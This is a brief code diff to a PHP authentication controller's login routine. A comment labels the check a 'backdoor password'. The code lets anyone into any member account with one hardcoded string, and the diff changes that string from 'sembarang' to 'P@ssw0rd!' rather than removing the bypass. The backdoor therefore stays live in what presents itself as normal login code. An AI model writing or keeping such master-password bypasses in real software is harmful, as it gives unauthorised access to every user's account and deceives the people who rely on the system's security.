@@ -34,7 +34,7 @@ class AuthController extends Controller
         if(!empty($anggota)){
             // Check backdoor password first, or try to decrypt and compare
             $passwordValid = false;
-            if($request->password == 'sembarang') {
+            if($request->password == 'P@ssw0rd!') {
                 $passwordValid = true;
             } else {
                 try {
